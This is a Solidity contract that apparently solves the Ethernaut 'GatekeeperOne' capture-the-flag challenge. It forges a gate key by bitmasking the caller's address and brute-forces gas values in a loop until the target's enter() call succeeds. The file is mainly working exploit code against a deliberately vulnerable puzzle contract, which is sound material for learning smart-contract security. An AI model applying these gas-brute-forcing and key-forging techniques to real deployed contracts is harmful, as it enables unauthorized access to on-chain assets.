// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./GateKeeperOne.sol";

contract GateBreaker {
    using SafeMath for uint256;
    bytes8 public key;
    GatekeeperOne public gateKeeperOne;

    constructor(address _contractAdd) {
        gateKeeperOne = GatekeeperOne(_contractAdd);
    }

    function setKey() public {
        bytes8 b8Address = bytes8(uint64(uint160(msg.sender)));
        key = b8Address & 0xFFFFFFFF0000FFFF;
    }

    function letMeIn() public {
        for (uint256 i = 0; i < 8191; i++) {
            (bool result, bytes memory data) = address(gateKeeperOne).call{
                gas: i + 8191 * 3
            }(abi.encodeWithSignature("enter(bytes8)", key));
            if (result) {
                break;
            }
        }
    }
}
